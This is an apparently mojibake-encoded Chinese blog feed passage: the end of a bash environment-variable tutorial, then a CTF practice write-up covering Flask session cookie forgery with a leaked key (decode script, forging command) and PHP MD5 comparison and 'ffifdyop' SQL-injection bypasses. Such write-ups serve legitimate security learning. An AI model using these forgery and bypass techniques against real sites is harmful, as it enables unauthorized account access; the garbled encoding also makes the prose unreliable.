envå’Œprintenvå‘½ä»¤åŒsetå‘½ä»¤çš„åŒºåˆ«åœ¨äºå‰ä¸¤ä¸ªå‘½ä»¤ä¸ä¼šå¯¹å˜é‡æ’åºï¼Œä¹Ÿä¸ä¼šè¾“å‡ºå±€éƒ¨å˜é‡å’Œç”¨æˆ·å®šä¹‰å˜é‡ã€‚  </p><hr><h3 id="6-2-è®¾ç½®ç”¨æˆ·å®šä¹‰å˜é‡"><a href="#6-2-è®¾ç½®ç”¨æˆ·å®šä¹‰å˜é‡" class="headerlink" title="6.2 è®¾ç½®ç”¨æˆ·å®šä¹‰å˜é‡"></a>6.2 è®¾ç½®ç”¨æˆ·å®šä¹‰å˜é‡</h3><p>å¯ä»¥åœ¨bash shellä¸­ç›´æ¥è®¾ç½®è‡ªå·±çš„å˜é‡ã€‚æœ¬èŠ‚å°†ä»‹ç»æ€æ ·åœ¨äº¤äº’å¼shellæˆ–shellè„šæœ¬ç¨‹åºä¸­åˆ›å»ºè‡ªå·±çš„å˜é‡å¹¶å¼•ç”¨å®ƒä»¬ã€‚  </p><h4 id="6-2-1-è®¾ç½®å±€éƒ¨ç”¨æˆ·å®šä¹‰å˜é‡"><a href="#6-2-1-è®¾ç½®å±€éƒ¨ç”¨æˆ·å®šä¹‰å˜é‡" class="headerlink" title="6.2.1 è®¾ç½®å±€éƒ¨ç”¨æˆ·å®šä¹‰å˜é‡"></a>6.2.1 è®¾ç½®å±€éƒ¨ç”¨æˆ·å®šä¹‰å˜é‡</h4><p>å¯åŠ¨äº†bash shellï¼ˆæˆ–è€…æ‰§è¡Œä¸€ä¸ªshellè„šæœ¬ï¼‰ï¼Œå°±èƒ½åˆ›å»ºåœ¨è¿™ä¸ªshell<strong>è¿›ç¨‹å†…å¯è§çš„å±€éƒ¨å˜é‡</strong>äº†ã€‚å¯ä»¥<font color="#FF5E3A" size="3">é€šè¿‡ç­‰å·ç»™ç¯å¢ƒå˜é‡èµ‹å€¼ï¼Œå€¼å¯ä»¥æ˜¯æ•°å€¼æˆ–å­—ç¬¦ä¸²</font>ã€‚  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment"># bash    //åˆ›å»ºå­è¿›ç¨‹</span>root@VM-16-11-debian:~<span class="token comment"># echo $myvar</span>root@VM-16-11-debian:~<span class="token comment"># myvar=hello</span>root@VM-16-11-debian:~<span class="token comment"># echo $myvar</span>helloroot@VM-16-11-debian:~<span class="token comment"># exit  //é€€å‡ºå­è¿›ç¨‹</span><span class="token builtin class-name">exit</span>root@VM-16-11-debian:~<span class="token comment"># echo $myvar  //ä¸å¯è§å…¶ä»–è¿›ç¨‹çš„ç¯å¢ƒå˜é‡</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç°åœ¨æ¯æ¬¡å¼•ç”¨my_variable ç¯å¢ƒå˜é‡çš„å€¼ï¼Œåªè¦é€šè¿‡<code>$my_variable</code>å¼•ç”¨å³å¯ã€‚</p><p>å¦‚æœè¦ç»™å˜é‡èµ‹ä¸€ä¸ª<strong>å«æœ‰ç©ºæ ¼</strong>çš„å­—ç¬¦ä¸²å€¼ï¼Œ<font color="#FF5E3A" size="3">å¿…é¡»ç”¨å¼•å·æ¥ç•Œå®šå­—ç¬¦ä¸²çš„é¦–å’Œå°¾</font>ã€‚    </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token assign-left variable">my_variable</span><span class="token operator">=</span>Hello World-bash: World: <span class="token builtin class-name">command</span> not found$$ <span class="token assign-left variable">my_variable</span><span class="token operator">=</span><span class="token string">"Hello World"</span>$$ <span class="token builtin class-name">echo</span> <span class="token variable">$my_variable</span>Hello World<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ²¡æœ‰å•å¼•å·çš„è¯ï¼Œ bash shellä¼šä»¥ä¸ºä¸‹ä¸€ä¸ªè¯æ˜¯å¦ä¸€ä¸ªè¦æ‰§è¡Œçš„å‘½ä»¤ã€‚æ³¨æ„ï¼Œ<strong>å®šä¹‰çš„å±€éƒ¨ç¯å¢ƒå˜é‡ç”¨çš„æ˜¯å°å†™å­—æ¯ï¼Œè€Œåˆ°ç›®å‰ä¸ºæ­¢ä½ æ‰€çœ‹åˆ°çš„ç³»ç»Ÿç¯å¢ƒå˜é‡éƒ½æ˜¯å¤§å†™å­—æ¯ã€‚</strong>  </p><p>è®°ä½ï¼Œå˜é‡åã€ç­‰å·å’Œå€¼ä¹‹é—´æ²¡æœ‰ç©ºæ ¼ï¼Œè¿™ä¸€ç‚¹éå¸¸é‡è¦ã€‚å¦‚æœåœ¨èµ‹å€¼è¡¨è¾¾å¼ä¸­åŠ ä¸Šäº†ç©ºæ ¼ï¼Œbash shellå°±ä¼šæŠŠå€¼å½“æˆä¸€ä¸ªå•ç‹¬çš„å‘½ä»¤ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ my_variable <span class="token operator">=</span> <span class="token string">"Hello World"</span>-bash: my_variable: <span class="token builtin class-name">command</span> not found<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="6-2-2-è®¾ç½®å…¨å±€ç¯å¢ƒå˜é‡"><a href="#6-2-2-è®¾ç½®å…¨å±€ç¯å¢ƒå˜é‡" class="headerlink" title="6.2.2 è®¾ç½®å…¨å±€ç¯å¢ƒå˜é‡"></a>6.2.2 è®¾ç½®å…¨å±€ç¯å¢ƒå˜é‡</h4><p>åˆ›å»ºå…¨å±€ç¯å¢ƒå˜é‡çš„æ–¹æ³•æ˜¯<font color="#FF5E3A" size="3">å…ˆåˆ›å»ºä¸€ä¸ªå±€éƒ¨ç¯å¢ƒå˜é‡ï¼Œç„¶åå†æŠŠå®ƒå¯¼å‡ºåˆ°å…¨å±€ç¯å¢ƒä¸­</font>ã€‚é€šè¿‡<code>export</code>å‘½ä»¤æ¥å®Œæˆï¼Œå˜é‡åå‰é¢ä¸éœ€è¦åŠ $ã€‚    </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment"># echo $myvar</span>root@VM-16-11-debian:~<span class="token comment"># myvar="I am global now"</span>root@VM-16-11-debian:~<span class="token comment"># export myvar</span>root@VM-16-11-debian:~<span class="token comment"># bash  //åˆ›å»ºå­shell</span>root@VM-16-11-debian:~<span class="token comment"># echo $myvar</span>I am global nowroot@VM-16-11-debian:~<span class="token comment"># exit</span><span class="token builtin class-name">exit</span>root@VM-16-11-debian:~<span class="token comment"># echo $myvar</span>I am global now<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¿®æ”¹å­shellä¸­å…¨å±€ç¯å¢ƒå˜é‡å¹¶ä¸ä¼šå½±å“åˆ°çˆ¶shellä¸­è¯¥å˜é‡çš„å€¼ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token assign-left variable">my_variable</span><span class="token operator">=</span><span class="token string">"I am Global now"</span>$ <span class="token builtin class-name">export</span> my_variable$$ <span class="token builtin class-name">echo</span> <span class="token variable">$my_variable</span>I am Global now$$ <span class="token function">bash</span>$$ <span class="token builtin class-name">echo</span> <span class="token variable">$my_variable</span>I am Global now$$ <span class="token assign-left variable">my_variable</span><span class="token operator">=</span><span class="token string">"Null"</span>$$ <span class="token builtin class-name">echo</span> <span class="token variable">$my_variable</span>Null$$ <span class="token builtin class-name">exit</span><span class="token builtin class-name">exit</span>$$ <span class="token builtin class-name">echo</span> <span class="token variable">$my_variable</span>I am Global now<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å­shellç”šè‡³æ— æ³•ä½¿ç”¨exportå‘½ä»¤æ”¹å˜çˆ¶shellä¸­å…¨å±€ç¯å¢ƒå˜é‡çš„å€¼ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token assign-left variable">my_variable</span><span class="token operator">=</span><span class="token string">"I am Global now"</span>$ <span class="token builtin class-name">export</span> my_variable$$ <span class="token builtin class-name">echo</span> <span class="token variable">$my_variable</span>I am Global now$$ <span class="token function">bash</span>$$ <span class="token builtin class-name">echo</span> <span class="token variable">$my_variable</span>I am Global now$$ <span class="token assign-left variable">my_variable</span><span class="token operator">=</span><span class="token string">"Null"</span>$$ <span class="token builtin class-name">export</span> my_variable$$ <span class="token builtin class-name">echo</span> <span class="token variable">$my_variable</span>Null$$ <span class="token builtin class-name">exit</span><span class="token builtin class-name">exit</span>$$ <span class="token builtin class-name">echo</span> <span class="token variable">$my_variable</span>I am Global now<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å°½ç®¡å­shellé‡æ–°å®šä¹‰å¹¶å¯¼å‡ºäº†å˜é‡my_variableï¼Œä½†<strong>çˆ¶shell</strong>ä¸­çš„my_variableå˜é‡<strong>ä¾ç„¶ä¿ç•™ç€åŸå…ˆçš„å€¼</strong>ã€‚ </p><h3 id="6-3-åˆ é™¤ç¯å¢ƒå˜é‡"><a href="#6-3-åˆ é™¤ç¯å¢ƒå˜é‡" class="headerlink" title="6.3 åˆ é™¤ç¯å¢ƒå˜é‡"></a>6.3 åˆ é™¤ç¯å¢ƒå˜é‡</h3><p>å¯ä»¥ç”¨unsetå‘½ä»¤åˆ é™¤å·²ç»å­˜åœ¨çš„ç¯å¢ƒå˜é‡ã€‚åœ¨unsetå‘½ä»¤ä¸­å¼•ç”¨ç¯å¢ƒå˜é‡æ—¶ï¼Œè®°ä½**ä¸è¦ä½¿ç”¨$**ã€‚  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment"># echo $myvar</span>I am global nowroot@VM-16-11-debian:~<span class="token comment"># unset myvar </span>root@VM-16-11-debian:~<span class="token comment"># echo $myvar</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><p><strong>çªé—¨</strong>     åœ¨æ¶‰åŠç¯å¢ƒå˜é‡åæ—¶ï¼Œè®°ä½ä¸€ç‚¹å°±è¡Œäº†ï¼šå¦‚æœè¦ç”¨åˆ°å˜é‡ï¼Œä½¿ç”¨$ï¼›å¦‚æœè¦æ“ä½œå˜é‡ä¸é€‚ç”¨ã€‚è¿™æ¡è§„åˆ™çš„ä¸€ä¸ªä¾‹å¤–å°±æ˜¯ä½¿ç”¨printenvæ˜¾ç¤ºæŸä¸ªå˜é‡çš„å€¼ã€‚  </p><hr><p>å¦‚æœä½ æ˜¯<font color="#FF5E3A" size="3">åœ¨å­è¿›ç¨‹ä¸­åˆ é™¤äº†ä¸€ä¸ªå…¨å±€ç¯å¢ƒå˜é‡ï¼Œè¿™åªå¯¹å­è¿›ç¨‹æœ‰æ•ˆ</font>ã€‚è¯¥å…¨å±€ç¯å¢ƒå˜é‡åœ¨çˆ¶è¿›ç¨‹ä¸­ä¾ç„¶å¯ç”¨ã€‚  </p><h3 id="6-4-è®¾ç½®-PATH-ç¯å¢ƒå˜é‡"><a href="#6-4-è®¾ç½®-PATH-ç¯å¢ƒå˜é‡" class="headerlink" title="6.4 è®¾ç½® PATH ç¯å¢ƒå˜é‡"></a>6.4 è®¾ç½® PATH ç¯å¢ƒå˜é‡</h3><p>å½“åœ¨shellå‘½ä»¤è¡Œç•Œé¢ä¸­è¾“å…¥ä¸€ä¸ªå¤–éƒ¨å‘½ä»¤æ—¶ï¼Œ shellå¿…é¡»<strong>æœç´¢ç³»ç»Ÿæ¥æ‰¾åˆ°å¯¹åº”çš„ç¨‹åº</strong>ã€‚ <font color="#FF5E3A" size="3">PATHç¯å¢ƒå˜é‡å®šä¹‰äº†ç”¨äºè¿›è¡Œå‘½ä»¤å’Œç¨‹åºæŸ¥æ‰¾çš„ç›®å½•</font>ã€‚  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment"># echo $PATH</span>/usr/local/java/jdk-16.0.1+9/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin<span class="token comment">#PATHä¸­çš„ç›®å½•ä½¿ç”¨å†’å·åˆ†éš”ã€‚</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å¦‚æœå‘½ä»¤æˆ–è€…ç¨‹åºçš„ä½ç½®æ²¡æœ‰åŒ…æ‹¬åœ¨PATHå˜é‡ä¸­ï¼Œé‚£ä¹ˆå¦‚æœä¸ä½¿ç”¨ç»å¯¹è·¯å¾„çš„è¯ï¼Œ shellæ˜¯æ²¡æ³•æ‰¾åˆ°çš„ã€‚å¦‚æœshellæ‰¾ä¸åˆ°æŒ‡å®šçš„å‘½ä»¤æˆ–ç¨‹åºï¼Œå®ƒä¼šäº§ç”Ÿä¸€ä¸ªé”™è¯¯ä¿¡æ¯ï¼š  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment"># myprog</span>-bash: myprog: <span class="token builtin class-name">command</span> not found<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è‹¥è¦æ·»åŠ æ–°çš„æœç´¢ç›®å½•ï¼Œåªéœ€å¼•ç”¨åŸæ¥çš„PATHå€¼ï¼Œç„¶åå†ç»™è¿™ä¸ªå­—ç¬¦ä¸²æ·»åŠ æ–°ç›®å½•å°±è¡Œäº†ã€‚  å°†ç›®å½•åŠ åˆ°PATHç¯å¢ƒå˜é‡ä¹‹åï¼Œå°±å¯ä»¥åœ¨è™šæ‹Ÿç›®å½•ç»“æ„ä¸­çš„ä»»ä½•ä½ç½®æ‰§è¡Œç¨‹åºã€‚  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token environment constant">$PATH</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games$$ <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token environment constant">$PATH</span>:/home/christine/Scripts$$ <span class="token builtin class-name">echo</span> <span class="token environment constant">$PATH</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/home/christine/Scripts$$ myprogThe factorial of <span class="token number">5</span> is <span class="token number">120</span>.$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p><strong>çªé—¨</strong>    å¦‚æœå¸Œæœ›å­shellä¹Ÿèƒ½æ‰¾åˆ°ä½ çš„ç¨‹åºçš„ä½ç½®ï¼Œä¸€å®šè¦è®°å¾—æŠŠä¿®æ”¹åçš„PATHç¯å¢ƒå˜é‡å¯¼å‡ºã€‚  </p><hr><p><font color="#FF5E3A" size="3"> è¿™ç§å¯¹PATHå˜é‡çš„ä¿®æ”¹åªèƒ½æŒç»­åˆ°é€€å‡ºæˆ–é‡å¯ç³»ç»Ÿã€‚è¿™ç§æ•ˆæœå¹¶ä¸èƒ½ä¸€ç›´æŒç»­ã€‚</font>  </p><hr><p><font color="#FF9999" size="3">æ–‡ç« å‚è€ƒï¼šLinuxå‘½ä»¤è¡Œä¸shellè„šæœ¬ç¼–ç¨‹å¤§å…¨.ç¬¬3ç‰ˆ by å¸ƒé²å§†ï¼Œå¸ƒé›·æ–¯çº³æ±‰ (z-lib.org)</font></p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux6/202202051442126.jpg" style="zoom:150%;">]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="å­¦ä¹ " scheme="https://huhu-myh.github.io/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="linux" scheme="https://huhu-myh.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>buuctfç»ƒä¹ ï¼š21-30</title>
    <link href="https://huhu-myh.github.io/posts/myh10012.html"/>
    <id>https://huhu-myh.github.io/posts/myh10012.html</id>
    <published>2022-01-30T03:17:33.000Z</published>
    <updated>2022-02-10T01:54:33.779Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="21-HCTF-2018-admin"><a href="#21-HCTF-2018-admin" class="headerlink" title="21.[HCTF 2018]admin"></a>21.[HCTF 2018]admin</h2><p>åˆšå¼€å§‹è¿˜ä»¥ä¸ºæ˜¯äºŒæ¬¡æ³¨å…¥ï¼Œä½†æ˜¯å‘ç°ä¸è¡Œã€‚éšä¾¿æ³¨å†Œä¸ªå·è¿›å»åï¼Œå‘ç°æ›´æ”¹å¯†ç çš„éƒ¨åˆ†å­˜åœ¨æºç ï¼Œä¸‹è½½åçœ‹åˆ°è¿™æ ·ä¸€æ®µä»£ç ï¼š</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">//index.html{% include('header.html') %}{% if current_user.is_authenticated %}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Hello {{ session['name'] }}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>{% endif %}{% if current_user.is_authenticated and session['name'] == 'admin' %}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>hctf{xxxxxxxxx}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>{% endif %}<span class="token comment">&lt;!-- you are not admin --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Welcome to hctf<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>{% include('footer.html') %}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°æ ¹æ®sessionä¸­çš„<code>name</code>å€¼æ¥ç¡®å®šæ˜¯ä¸æ˜¯admin,æ‰€ä»¥æƒ³åˆ°<font color="#FF5E3A" size="3">flask session ä¼ªé€ </font>ï¼Œè€Œ<font color="#FF5E3A" size="3">flaskçš„sessionæ˜¯åœ¨å®¢æˆ·ç«¯çš„</font>ï¼Œå› æ­¤å¯ä»¥å°è¯•è¿›è¡Œä¼ªé€ ï¼Œä½†æ˜¯ä¼ªé€ éœ€è¦<font color="#FF5E3A" size="3">å¯†é’¥</font>ï¼Œå‘ç°å¯†é’¥å°±åœ¨æˆ‘ä»¬ä¸‹è½½çš„æ–‡ä»¶å¤¹é‡Œï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu3/202202041054285.png"></p><p>æ‰€ä»¥æ¥ä¸‹æ¥å…ˆè§£å¯†sessionï¼Œè¿™é‡Œå¯ä»¥ç”¨ä¸€ä¸ªè„šæœ¬ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#ç”¨æ³•åœ¨ç»ˆç«¯è¾“å…¥ï¼špython session_decode.py your-session</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> zlib<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64decode<span class="token keyword">from</span> flask<span class="token punctuation">.</span>sessions <span class="token keyword">import</span> session_json_serializer<span class="token keyword">from</span> itsdangerous <span class="token keyword">import</span> base64_decode <span class="token keyword">def</span> <span class="token function">decryption</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload<span class="token punctuation">,</span> sig <span class="token operator">=</span> payload<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">b'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>    payload<span class="token punctuation">,</span> timestamp <span class="token operator">=</span> payload<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">b'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>     decompress <span class="token operator">=</span> <span class="token boolean">False</span>    <span class="token keyword">if</span> payload<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">b'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> payload<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        decompress <span class="token operator">=</span> <span class="token boolean">True</span>     <span class="token keyword">try</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> base64_decode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not base64 decode the payload because of '</span>                         <span class="token string">'an exception'</span><span class="token punctuation">)</span>     <span class="token keyword">if</span> decompress<span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            payload <span class="token operator">=</span> zlib<span class="token punctuation">.</span>decompress<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not zlib decompress the payload before '</span>                             <span class="token string">'decoding the payload'</span><span class="token punctuation">)</span>     <span class="token keyword">return</span> session_json_serializer<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>decryption<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>       <span class="token comment">#è§£å¯†å¾—åˆ°ï¼š{'_fresh': True, '_id': b'd36b0289542c58199f0077265e16573dce66036e3543284e1c3b4be2fbeeb15674be6453b16bf51b3acbb744a96506026944dc1b663f8adb7673c5ebaceeb6be', 'csrf_token': b'16c4ef7f11713de97039735f894c40b4846df5de', 'image': b'j6il', 'name': '1', 'user_id': '11'}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åæŠŠnameçš„å€¼æ”¹ä¸ºadminï¼Œåœ¨ä½¿ç”¨å¯†é’¥åŠ å¯†ä¸€ä¸‹å¾—åˆ°sessionå€¼ã€‚åŠ å¯†è„šæœ¬ï¼ˆä¹Ÿå¯ä»¥è§£å¯†ï¼‰ï¼š</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">git clone https://github.com/noraj/flask-session-cookie-manager<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åä½¿ç”¨å‘½ä»¤ï¼š</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ python{2,3} flask_session_cookie_manager{2,3}.py encode -s '.{y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV};K|ghT^d' -t '{"number":"326410031505","username":"admin"}'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu3/202202041054287.png"></p><p>å°†åŠ å¯†åçš„sessioné‡æ–°æ·»åŠ åˆ°cookieä¸­å¾—åˆ°flagï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu3/202202041054289.png"></p><h2 id="22-BJDCTF2020-Easy-MD5"><a href="#22-BJDCTF2020-Easy-MD5" class="headerlink" title="22.[BJDCTF2020]Easy MD5"></a>22.[BJDCTF2020]Easy MD5</h2><p>è¿™ä¸ªé¢˜åˆšå¼€å§‹ç›´æ¥æ³¨å•¥ä¹Ÿæ²¡æœ‰ï¼Œçœ‹äº†ä¸€ä¸‹å“åº”å¤´å‘ç°æœ‰ä¸œè¥¿ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu3/202202041054290.png"></p><p>æœç´¢æŸ¥åˆ°MD5()trueå‚æ•°æ¼æ´ï¼Œå‘ç°<code>ffifdyop</code>ä¼šé€ æˆæ¼æ´ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu3/202202041054291.png"></p><p>è¾“å‡ºçš„å¼€å¤´æ˜¯â€™orâ€™6xxxxxx åœ¨æ•°æ®åº“è¯­å¥é‡Œå°±æ„æˆäº†select * from â€˜adminâ€™ where password= â€˜â€™orâ€™6xxxxxx â€™ å˜æˆæ°¸çœŸå¼ã€‚ç„¶åæ¥åˆ°levels91.phpï¼ŒæŸ¥çœ‹æºç çœ‹åˆ°ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">!=</span> <span class="token variable">$b</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment">// wow, glzjin wants a girl friend.</span><span class="token operator">--</span><span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å°±æ˜¯ç®€å•çš„å¼±æ¯”è¾ƒï¼Œç»•è¿‡çš„ç­”æ¡ˆæœ‰å¾ˆå¤šç§ã€‚è¿™é‡Œå°±ç”¨æ•°ç»„ç»•è¿‡:<code>a[]=1&amp;b[]=2</code>ï¼Œè¿›å…¥åˆ°levell14.phpï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'param1'</span><span class="token punctuation">]</span><span class="token operator">!==</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'param2'</span><span class="token punctuation">]</span><span class="token operator">&amp;&amp;</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'param1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'param2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">}</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å’Œä¸Šä¸€ä¸ªå·®ä¸å¤šï¼Œæ— éå°±æ˜¯postä¼ å‚ä»¥åŠè½¬åˆ«ä¸ºäº†å¼ºæ¯”è¾ƒï¼ŒåŒæ 